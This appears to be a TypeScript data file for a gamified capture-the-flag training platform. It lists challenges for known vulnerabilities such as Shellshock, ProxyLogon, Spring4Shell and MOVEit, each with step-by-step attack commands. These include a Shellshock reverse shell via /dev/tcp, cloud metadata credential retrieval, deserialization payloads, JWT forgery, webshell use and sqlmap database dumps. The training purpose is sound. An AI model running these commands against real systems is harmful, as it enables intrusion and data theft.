      "Server-Side Request Forgery (SSRF) tricks the server into making requests to internal resources. The server acts as a proxy, allowing attackers to reach internal services (metadata APIs, databases, internal dashboards) that are otherwise inaccessible. Formally documented as a major threat around 2008–2012.",
    impact:
      "Cloud metadata theft (AWS IMDSv1 credentials), internal port scanning, access to internal services, RCE via chained vulnerabilities.",
    realWorldExample:
      "Capital One (2019) — SSRF on AWS IMDSv1 led to 106M customer records stolen. Cost: $190M in fines.",
    loss: "$190M+ (Capital One), total SSRF damages: billions",
    steps: [
      { step: 1, title: "Find URL Parameter", description: "Look for parameters that fetch remote URLs.", command: "ffuf -u 'http://<TARGET_IP>/FUZZ' -w wordlist.txt", hint: "Look for /fetch?url=, /proxy?target=, /image?src=" },
      { step: 2, title: "Test Internal Access", description: "Try to access internal services.", command: "curl 'http://<TARGET_IP>/fetch?url=http://127.0.0.1:8080/admin'", hint: "Try 127.0.0.1, 169.254.169.254 (AWS metadata), 10.0.0.1" },
      { step: 3, title: "Access Cloud Metadata", description: "Fetch AWS instance metadata.", command: "curl 'http://<TARGET_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'", hint: "The flag is embedded in the metadata response." },
    ],
    tools: ["curl", "Burp Suite", "ffuf"],
    flagFormat: "FLAG{ssrf_1nt3rn4l_m3t4d4t4_2008}",
    tags: ["ssrf", "cloud", "metadata", "internal-network", "owasp-top-10"],
  },
  {
    id: "WEB-2010-001",
    level: 14,
    year: 2010,
    name: "Insecure Deserialization",
    shortName: "Insecure Deserialization",
    category: "Web",
    difficulty: "Hard",
    cvss: 9.0,
    xpReward: 500,
    status: "active",
    description:
      "Insecure deserialization occurs when untrusted data is used to abuse the logic of an application during deserialization. Java, PHP, Python, and .NET apps that deserialize user-controlled data are vulnerable. Attackers craft malicious serialized objects that execute arbitrary code when deserialized.",
    impact:
      "Remote Code Execution, authentication bypass, privilege escalation, DoS.",
    realWorldExample:
      "Apache Struts (CVE-2017-5638) — Equifax breach: 147M records, $575M settlement. Jenkins RCE via Java deserialization.",
    loss: "Equifax: $700M+ total. Struts deserialization class of vulnerabilities: $1B+",
    steps: [
      { step: 1, title: "Identify Serialized Data", description: "Look for Base64 or hex-encoded data in cookies/params.", command: "curl -v http://<TARGET_IP>/app | grep -i cookie", hint: "Java serialized objects start with: rO0AB (Base64) or AC ED 00 05 (hex)" },
      { step: 2, title: "Generate Payload with ysoserial", description: "Create a malicious serialized object.", command: "java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0", hint: "Replace 'id' with your command. Try 'cat /flag.txt'" },
      { step: 3, title: "Send the Payload", description: "Inject the payload in the vulnerable cookie/parameter.", command: "curl -H 'Cookie: session=<PAYLOAD>' http://<TARGET_IP>/dashboard", hint: "If RCE works, flag appears in response." },
    ],
    tools: ["ysoserial", "Burp Suite", "java", "curl"],
    flagFormat: "FLAG{d3s3r14l1z4t10n_rce_2010}",
    tags: ["deserialization", "rce", "java", "owasp-top-10", "hard"],
  },
  {
    id: "NET-2014-002",
    level: 16,
    year: 2014,
    name: "Shellshock — Bash Remote Code Execution",
    shortName: "Shellshock",
    category: "Network",
    difficulty: "Hard",
    cvss: 10.0,
    cve: "CVE-2014-6271",
    xpReward: 650,
    status: "active",
    description:
      "Shellshock (CVE-2014-6271) is a critical bash vulnerability where specially crafted environment variables execute arbitrary commands. Attackers exploit CGI scripts that pass HTTP headers to bash, making any web server running CGI potentially vulnerable. Discovered September 2014, exploited within hours.",
    impact:
      "Unauthenticated RCE via HTTP headers. Affected millions of web servers, embedded devices, and DHCP clients.",
    realWorldExample:
      "Yahoo and WinZip compromised within 24h. US DoD scanned 72h after disclosure. Botnets built in days.",
    steps: [
      { step: 1, title: "Find CGI Endpoint", description: "Locate a CGI script on the target.", command: "ffuf -u http://<TARGET_IP>/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .sh,.cgi,.pl", hint: "Look for /cgi-bin/test.sh or /cgi-bin/status" },
      { step: 2, title: "Test for Shellshock", description: "Send the Shellshock payload in User-Agent.", command: "curl -H 'User-Agent: () { :;}; echo; echo VULNERABLE' http://<TARGET_IP>/cgi-bin/test.sh", hint: "If you see 'VULNERABLE' in response, it works!" },
      { step: 3, title: "Get Reverse Shell", description: "Use Shellshock for a reverse shell.", command: "curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' http://<TARGET_IP>/cgi-bin/test.sh" },
      { step: 4, title: "Read Flag", description: "On your shell, read the flag.", command: "cat /flag.txt" },
    ],
    tools: ["curl", "nmap", "netcat", "ffuf"],
    flagFormat: "FLAG{sh3llsh0ck_b4sh_rce_2014}",
    tags: ["shellshock", "bash", "rce", "cgi", "critical", "cve"],
  },
  {
    id: "WEB-2016-001",
    level: 17,
    year: 2016,
    name: "Broken Authentication — JWT None Algorithm",
    shortName: "JWT None Algorithm",
    category: "Web",
    difficulty: "Medium",
    cvss: 9.1,
    xpReward: 420,
    status: "active",
    description:
      "JSON Web Tokens (JWT) with the 'none' algorithm attack allows attackers to forge tokens without a valid signature. Some JWT libraries (pre-2016 versions) accept 'alg: none' tokens as valid, bypassing authentication entirely. Simple to exploit — just change the algorithm and strip the signature.",
    impact: "Complete authentication bypass. Impersonate any user including admins.",
    realWorldExample:
      "Auth0 library (2015), python-jwt (2017), several enterprise SSO systems affected. Still found in the wild today.",
    steps: [
      { step: 1, title: "Get a JWT Token", description: "Login with test credentials to get a JWT.", command: "curl -X POST http://<TARGET_IP>/api/login -d '{\"user\":\"test\",\"pass\":\"test\"}' -H 'Content-Type: application/json'", hint: "Copy the token from the response." },
      { step: 2, title: "Decode the Token", description: "Base64 decode the header and payload.", command: "echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d", hint: "Header shows the algorithm. Payload shows user info." },
      { step: 3, title: "Forge a None-Algorithm Token", description: "Craft a new token with alg:none and admin role.", command: "python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')\"" },
      { step: 4, title: "Use the Forged Token", description: "Access admin endpoint with the forged token.", command: "curl -H 'Authorization: Bearer <FORGED_TOKEN>' http://<TARGET_IP>/api/admin/flag" },
    ],
    tools: ["curl", "Burp Suite", "python3", "jwt_tool"],
    flagFormat: "FLAG{jwt_n0n3_4lg0_byp4ss_2016}",
    tags: ["jwt", "authentication-bypass", "web", "api", "token-forgery"],
  },
  {
    id: "WEB-2017-001",
    level: 18,
    year: 2017,
    name: "Apache Struts RCE — Equifax Breach",
    shortName: "Apache Struts RCE",
    category: "Web",
    difficulty: "Hard",
    cvss: 10.0,
    cve: "CVE-2017-5638",
    xpReward: 700,
    status: "active",
    description:
      "CVE-2017-5638 is an RCE vulnerability in Apache Struts 2 via the Jakarta Multipart parser. A malicious Content-Type header triggers OGNL expression injection, executing arbitrary OS commands. This vulnerability was used in the Equifax breach — the largest credit bureau hack in history.",
    impact: "Unauthenticated RCE. Used to compromise Equifax, exposing 147 million Americans' SSNs, DOBs, and credit history.",
    realWorldExample: "Equifax (2017) — 147M records stolen. $700M+ settlement. CEO resigned.",
    loss: "$700M+ Equifax settlement. Estimated $4B+ total consumer harm.",
    steps: [
      { step: 1, title: "Identify Apache Struts", description: "Confirm the target runs Apache Struts.", command: "curl -I http://<TARGET_IP>/index.action", hint: "Look for .action extensions, Struts headers." },
      { step: 2, title: "Test for CVE-2017-5638", description: "Send malicious Content-Type header.", command: "curl -X POST http://<TARGET_IP>/index.action -H 'Content-Type: %{(#_=\\'multipart/form-data\\').....#cmd=\\'id\\'}'", hint: "Use the struts-pwn exploit script for clean exploitation." },
      { step: 3, title: "Use struts-pwn", description: "Automated exploitation.", command: "python3 struts-pwn.py --url http://<TARGET_IP>/index.action --cmd 'cat /flag.txt'" },
    ],
    tools: ["curl", "python3", "nmap", "Burp Suite"],
    flagFormat: "FLAG{str4ts_rce_3qu1f4x_2017}",
    tags: ["apache-struts", "ognl", "rce", "critical", "equifax", "cve"],
  },
  {
    id: "WEB-2018-001",
    level: 19,
    year: 2018,
    name: "IDOR — Insecure Direct Object Reference",
    shortName: "IDOR",
    category: "Web",
    difficulty: "Medium",
    cvss: 8.1,
    xpReward: 380,
    status: "active",
    description:
      "Insecure Direct Object Reference (IDOR) occurs when an application uses user-controllable input to access objects directly without proper authorization checks. Attackers simply change an ID or reference to access other users' data. One of the most prevalent web vulnerabilities — found across every major platform.",
    impact:
      "Access to other users' private data, messages, transactions, PII. Account takeover, mass data breach.",
    realWorldExample:
      "Instagram (2019) — IDOR exposed private photos. Uber (2016) — driver/rider data. HackerOne — disclosed to itself. Facebook, Twitter, LinkedIn all had IDOR bugs.",
    steps: [
      { step: 1, title: "Login and Find Object Reference", description: "Login and observe the user-specific URL/ID.", command: "curl -c cookies.txt -X POST http://<TARGET_IP>/login -d 'user=attacker&pass=attacker'", hint: "After login, visit /api/user/profile?id=YOUR_ID" },
      { step: 2, title: "Enumerate Other IDs", description: "Change the ID to access other users.", command: "for i in {1..20}; do curl -b cookies.txt http://<TARGET_IP>/api/user/profile?id=$i; done", hint: "ID 1 is usually admin. Try ID 1, 2, 3..." },
      { step: 3, title: "Access Admin Profile", description: "The flag is in the admin user's private data.", command: "curl -b cookies.txt 'http://<TARGET_IP>/api/user/profile?id=1'", hint: "Look for 'flag' or 'secret' field in the JSON response." },
    ],
    tools: ["curl", "Burp Suite", "python3"],
    flagFormat: "FLAG{1d0r_4cc3ss_c0ntr0l_2018}",
    tags: ["idor", "broken-access-control", "web", "authorization", "owasp-top-10"],
  },
  {
    id: "WEB-2021-002",
    level: 21,
    year: 2021,
    name: "ProxyLogon — Microsoft Exchange RCE",
    shortName: "ProxyLogon",
    category: "Web",
    difficulty: "Insane",
    cvss: 9.8,
    cve: "CVE-2021-26855",
    xpReward: 1100,
    status: "active",
    description:
      "ProxyLogon (CVE-2021-26855) is a pre-authentication SSRF vulnerability in Microsoft Exchange that, when chained with CVE-2021-27065 (post-auth file write), achieves unauthenticated RCE. Exploited by HAFNIUM (Chinese APT) to install webshells on 250,000+ Exchange servers worldwide before patching.",
    impact:
      "Unauthenticated RCE on Exchange servers. Full mailbox access, credential theft, lateral movement to entire organization.",
    realWorldExample:
      "HAFNIUM APT (China-linked) — 250,000+ Exchange servers compromised globally in early 2021. US govt agencies, banks, defense contractors affected.",
    loss: "Billions in incident response globally. US CISA emergency directive issued.",
    steps: [
      { step: 1, title: "Identify Exchange Server", description: "Confirm the target is Exchange.", command: "curl -k -I https://<TARGET_IP>/owa/", hint: "Look for X-OWA headers, /owa/, /ecp/ paths." },
      { step: 2, title: "SSRF via CVE-2021-26855", description: "Use the SSRF to read internal resources.", command: "curl -k 'https://<TARGET_IP>/ecp/a.js?__VIEWSTATEGENERATOR=...' -H 'Cookie: X-BEResource=...'", hint: "Use the proxylogon.py exploit script." },
      { step: 3, title: "Write Webshell", description: "Chain with CVE-2021-27065 to write a webshell.", command: "python3 proxylogon.py <TARGET_IP> email@target.com" },
      { step: 4, title: "Execute via Webshell", description: "Use the dropped webshell to read the flag.", command: "curl -k 'https://<TARGET_IP>/aspnet_client/shell.aspx?cmd=type+C:\\flag.txt'" },
    ],
    tools: ["curl", "python3", "nmap", "Burp Suite"],
    flagFormat: "FLAG{pr0xyl0g0n_3xch4ng3_rce_2021}",
    tags: ["proxylogon", "exchange", "rce", "ssrf", "apt", "critical", "cve"],
  },
  {
    id: "WEB-2022-001",
    level: 22,
    year: 2022,
    name: "Spring4Shell — Spring Framework RCE",
    shortName: "Spring4Shell",
    category: "Web",
    difficulty: "Insane",
    cvss: 9.8,
    cve: "CVE-2022-22965",
    xpReward: 1050,
    status: "active",
    description:
      "Spring4Shell (CVE-2022-22965) is a critical RCE in Spring Framework. It exploits Spring MVC's data binding feature with JDK 9+ class loader to write a webshell. Named Spring4Shell due to its similarity to Log4Shell. Affects Spring Framework 5.3.x and 5.2.x when deployed on Tomcat.",
    impact:
      "Unauthenticated RCE on Spring-based Java applications. Full server compromise.",
    realWorldExample:
      "Exploited in the wild within 24h of disclosure. Botnets including Mirai used it to install cryptominers.",
    steps: [
      { step: 1, title: "Identify Spring Application", description: "Look for Spring/Java indicators.", command: "curl -I http://<TARGET_IP>/ | grep -i 'spring\\|java\\|tomcat'", hint: "Check Server header and error pages." },
      { step: 2, title: "Test Spring4Shell", description: "Send the class loader manipulation payload.", command: "curl -X POST 'http://<TARGET_IP>/helloworld/greeting' --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if...'" },
      { step: 3, title: "Write Webshell via Tomcat Log", description: "The exploit writes shell.jsp to webroot.", command: "python3 spring4shell.py --url http://<TARGET_IP>/" },
      { step: 4, title: "Execute Commands", description: "Access the webshell and read flag.", command: "curl 'http://<TARGET_IP>/shell.jsp?cmd=cat+/flag.txt'" },
    ],
    tools: ["curl", "python3", "Burp Suite", "nmap"],
    flagFormat: "FLAG{spr1ng4sh3ll_rce_2022}",
    tags: ["spring4shell", "spring", "java", "rce", "critical", "cve"],
  },
  {
    id: "WEB-2023-001",
    level: 24,
    year: 2023,
    name: "MOVEit Transfer SQLi — Mass Data Breach",
    shortName: "MOVEit Transfer SQLi",
    category: "Web",
    difficulty: "Insane",
    cvss: 9.8,
    cve: "CVE-2023-34362",
    xpReward: 1300,
    status: "new",
    description:
      "CVE-2023-34362 is a critical SQL injection in Progress MOVEit Transfer that allows unauthenticated attackers to gain elevated privileges and access data. Exploited by Cl0p ransomware group in a massive campaign targeting 2,500+ organizations. One of the largest breach campaigns in history.",
    impact:
      "Unauthenticated SQLi → authentication bypass → data exfiltration. Mass exploitation by Cl0p ransomware gang.",
    realWorldExample:
      "Cl0p ransomware gang (2023) — 2,500+ organizations breached including BBC, British Airways, Shell, US govt agencies. 84M+ people affected.",
    loss: "$9.9B+ estimated total damages (Emsisoft report 2023)",
    steps: [
      { step: 1, title: "Identify MOVEit Transfer", description: "Confirm the target is MOVEit Transfer.", command: "curl -k https://<TARGET_IP>/moveit/", hint: "Look for MOVEit in the page title or /human.aspx" },
      { step: 2, title: "Test SQLi Endpoint", description: "The vulnerable endpoint is /guestaccess.aspx.", command: "curl -k -X POST 'https://<TARGET_IP>/guestaccess.aspx' --data 'LoginForm=1&userID=1\\'", hint: "SQL error means vulnerable. Use sqlmap next." },
      { step: 3, title: "Automated Exploitation", description: "Use sqlmap to dump the database.", command: "sqlmap -u 'https://<TARGET_IP>/guestaccess.aspx' --data='LoginForm=1&userID=1' --level=5 --risk=3 --dbs", hint: "Then: -D moveitdb --tables, -T flags --dump" },
      { step: 4, title: "Exfiltrate the Flag", description: "Dump the flags table.", command: "sqlmap ... -D moveitdb -T flags --dump" },
    ],
    tools: ["curl", "sqlmap", "Burp Suite", "nmap"],
    flagFormat: "FLAG{m0v31t_sql1_cl0p_2023}",
    tags: ["sqli", "moveit", "ransomware", "cl0p", "critical", "cve", "new"],
  },
];

export const CATEGORIES = [
  "All",
  "Web",
  "Network",
  "System",
  "Crypto",
  "API",
  "Cloud",
  "IoT",
  "OT/ICS",
] as const;

export const DIFFICULTY_COLORS: Record<Difficulty, string> = {
  Beginner: "text-green-400 border-green-400",
  Easy: "text-emerald-400 border-emerald-400",
  Medium: "text-yellow-400 border-yellow-400",
  Hard: "text-orange-400 border-orange-400",
  Insane: "text-red-400 border-red-400",
};

export const DIFFICULTY_BG: Record<Difficulty, string> = {
  Beginner: "bg-green-400/10",
  Easy: "bg-emerald-400/10",
  Medium: "bg-yellow-400/10",
  Hard: "bg-orange-400/10",
  Insane: "bg-red-400/10",
};

export const XP_TO_RANK = [
  { rank: "Script Kiddie", minXP: 0, icon: "💻" },
  { rank: "Apprentice", minXP: 500, icon: "🔍" },
  { rank: "Hacker", minXP: 2000, icon: "🎯" },
  { rank: "Elite Hacker", minXP: 5000, icon: "⚡" },
  { rank: "Red Teamer", minXP: 10000, icon: "🔴" },
  { rank: "Legend", minXP: 25000, icon: "💀" },
];
